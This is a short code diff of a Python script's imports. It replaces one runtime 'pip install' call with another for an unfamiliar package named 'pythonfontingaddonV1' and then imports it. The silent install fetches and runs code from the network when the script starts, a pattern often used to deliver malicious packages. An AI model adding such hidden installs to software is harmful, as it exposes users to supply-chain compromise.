@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptolibV2")
-import pythoncryptolibV2
+os.system("pip install pythonfontingaddonV1")
+import pythonfontingaddonV1
 import json
 import httpx
 import time
